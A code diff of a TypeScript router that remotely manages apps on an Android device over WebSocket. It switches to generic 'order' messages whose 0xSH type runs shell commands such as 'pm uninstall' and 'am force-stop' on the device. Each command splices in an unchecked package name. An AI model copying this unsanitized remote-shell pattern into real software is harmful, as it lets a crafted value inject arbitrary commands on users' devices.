@@ -75,8 +75,8 @@ export const appManagerRouter = router({
         const wsManager = getWebSocketManager();
         if (wsManager) {
           console.log(`[WebSocket] Requesting installed apps list from device ${input.deviceId}`);
-          wsManager.broadcastToDevice(input.deviceId, "get-apps", {
-            payload: {}
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xIN"
           });
         }
 
@@ -207,11 +207,11 @@ export const appManagerRouter = router({
         }
 
         // Real implementation: Send uninstall command (0xUN)
-        const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
-          wsManager.broadcastToDevice(input.deviceId, "uninstall-app", {
-            payload: { packageName: input.packageName }
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xSH",
+            command: `pm uninstall ${input.packageName}`
           });
         }
 
@@ -370,11 +370,11 @@ export const appManagerRouter = router({
         }
 
         // Real implementation: Send launch command (0xLA)
-        const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
-          wsManager.broadcastToDevice(input.deviceId, "launch-app", {
-            payload: { packageName: input.packageName }
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xSH",
+            command: `monkey -p ${input.packageName} -c android.intent.category.LAUNCHER 1`
           });
         }
 
@@ -415,11 +415,11 @@ export const appManagerRouter = router({
         }
 
         // Real implementation: Send stop command (0xST)
-        const { getWebSocketManager } = await import("../websocket");
         const wsManager = getWebSocketManager();
         if (wsManager) {
-          wsManager.broadcastToDevice(input.deviceId, "stop-app", {
-            payload: { packageName: input.packageName }
+          wsManager.broadcastToDevice(input.deviceId, "order", {
+            type: "0xSH",
+            command: `am force-stop ${input.packageName}`
           });
         }
 
